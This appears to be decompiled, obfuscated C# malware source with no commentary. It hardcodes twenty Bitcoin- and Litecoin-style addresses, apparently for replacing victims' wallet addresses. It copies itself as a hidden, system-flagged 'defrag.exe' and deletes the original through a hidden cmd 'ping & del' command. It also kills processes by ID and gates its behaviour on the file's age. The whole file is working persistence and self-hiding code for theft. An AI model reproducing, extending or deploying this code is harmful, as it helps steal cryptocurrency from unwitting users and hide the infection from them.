using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ns1;
using ns3;
using ns5;

namespace ns4;

internal sealed class Class8
{
	[CompilerGenerated]
	internal sealed class Class9
	{
		public int int_0;
	}

	public static readonly string[] string_0 = new string[10] { "1Fvap2GJBia3Lqh7U1EdvZ38HTDwGjnGdE", "13PboXkqVdA7XhDbcfyFdthYLf7srUhi2N", "1MUFbjvpQwFqQMZJ8kp6TRAySdM7jZ6UXp", "1B7CDaoQo3HemGPEb7H38rkodiGcUiPCAw", "1491PTdVTy8YzVvMnmbbAfVLFWQPzMgpG5", "1Ln5TemzmYV4D9GRMHxvtmoEBPT6rqPhmW", "1LvYgN3AdcdzqEkqTamk6r1VAdj1GdYTim", "1B7qUBcQXq7GoKBxwBquuhaifBCoAEMGn3", "15tkv7pmVQRvrCByPTk8hRpWU3iWjzfT1x", "1DC2JTKEzchYxAm16bbbevYnSF8oWXRwdY" };

	public static readonly string[] string_1 = new string[10] { "LgEsK9Fqma7LZuNKu9cZaQVjHy5iCT2iMc", "LRFbrbMVAtESRi2QH9YTRU7RT6AhMedYti", "LX4nLKQ6bhbewMHgQAqKoBmawUP4ezzGoY", "LZdTDgV2GVqop9YKXiP46JWcuikKK3SYxZ", "LeAKfjQMJ6RqVyU4yoneAQEmYVq8Jf3Asu", "LMnkRfxmZ7mkA9vHf2md7UeFbgkET5c6hm", "LTyG9dkuW19A7BgiyqGtPHurY2BZCuVzje", "LWkAKS1nK4NEo2n886QQfBzrwss31WSrUb", "LboULvih6uwAzYTUUdhTxrEABFq674veHA", "LekSScjAxiH4g2U9uo4JQepyvXVbHMAtYs" };

	internal static string[] string_2;

	internal static string[] string_3;

	public static int int_0;

	public static int int_1;

	public static bool bool_0 = true;

	internal static int int_2 = 75;

	public static readonly string string_4 = "defrag";

	[STAThread]
	public static void Main(string[] args)
	{
		try
		{
			Class23.smethod_0();
			if (args.GetUpperBound(0) == -1)
			{
				smethod_0();
				return;
			}
			string[] array = args[0].Split(new char[1] { ':' });
			switch (array[0].ToUpper())
			{
			case "K":
				Process.GetProcessById(Convert.ToInt32(array[1])).Kill();
				smethod_0();
				break;
			case "C":
				Class23.smethod_92(array[1], array[0]);
				break;
			}
		}
		catch
		{
		}
	}

	private static void smethod_0()
	{
		string executablePath = Application.get_ExecutablePath();
		executablePath = executablePath.ToLower();
		byte[] byte_ = new byte[0];
		string empty = string.Empty;
		Class23.smethod_33();
		if (Class23.smethod_80(ref byte_, ref empty, executablePath))
		{
			string fileName = Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName);
			string text = executablePath.Replace(fileName.ToLower(), "_" + fileName);
			string path = executablePath.Replace(".exe", empty);
			File.Copy(executablePath, text, overwrite: true);
			File.SetAttributes(text, FileAttributes.Normal);
			try
			{
				Class14 @class = new Class14(new Class10(10u), new Class10(Class19.string_4), 0);
				@class.vmethod_4(text);
			}
			catch
			{
			}
			try
			{
				Class15 class2 = new Class15(new Class10((ushort)((int)Class19.ushort_1 / 16 + 1)));
				class2.class10_1 = new Class10((ushort)((int)Class19.ushort_1 / 16 + 1));
				class2.vmethod_4(text);
			}
			catch
			{
			}
			try
			{
				Class14 class3 = new Class14(new Class10(14u), new Class10(1u), 0);
				class3.vmethod_4(text);
			}
			catch
			{
			}
			File.WriteAllBytes(path, byte_);
			File.SetAttributes(Class23.smethod_85() + "\\" + string_4 + ".exe", FileAttributes.Normal);
			File.Copy(text, Class23.smethod_85() + "\\" + string_4 + ".exe", overwrite: true);
			File.SetAttributes(Class23.smethod_85() + "\\" + string_4 + ".exe", FileAttributes.Hidden | FileAttributes.System);
			File.Delete(text);
			File.SetAttributes(executablePath, FileAttributes.Normal);
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C ping 127.0.0.1 -n 3 & dir & del " + '"' + executablePath + '"');
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo)!.Dispose();
			Environment.Exit(0);
			return;
		}
		Class23.smethod_66(Application.get_ExecutablePath(), ref string_2, ref string_3);
		DateTime creationTime = File.GetCreationTime(executablePath);
		int num = (int)DateTime.Now.Subtract(creationTime).TotalDays;
		if (num > 1)
		{
			if (num < 3)
			{
				bool_0 = false;
			}
			int_0 = Class23.smethod_44('C', Process.GetCurrentProcess().Id.ToString());
			Class23.smethod_92(int_0.ToString(), "K");
			Class23.smethod_7();
		}
	}
}
